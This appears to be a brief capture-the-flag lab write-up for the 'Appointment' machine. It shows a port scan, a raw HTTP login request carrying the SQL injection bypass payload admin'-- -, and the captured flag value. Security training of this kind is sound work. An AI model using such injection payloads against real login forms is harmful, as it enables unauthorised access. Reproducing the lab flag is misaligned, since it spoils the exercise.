# Appointment — Tier 1

**Concept:** SQL injection bypass on a web application login form to retrieve the flag.

## Recon

```
PORT   STATE SERVICE
80/tcp open  http
```

Web application with a login form.

## Exploitation

### Step 1 — SQL Injection Login Bypass

Used a SQL injection payload to bypass authentication:

```
POST / HTTP/1.1
Host: 10.129.x.x
Content-Type: application/x-www-form-urlencoded

username=admin'-- -&password=x
```

### Step 2 — Retrieve Flag

After successful login bypass, the flag was displayed on the dashboard.

## Findings

| Field | Value |
|-------|-------|
| Target IP | `10.129.x.x` |
| Service | HTTP (port 80) |
| Attack Vector | SQL injection (comment-based bypass) |
| Payload | `admin'-- -` |
| Flag | `e3d0796d002a446c0e622226f42e9672` |
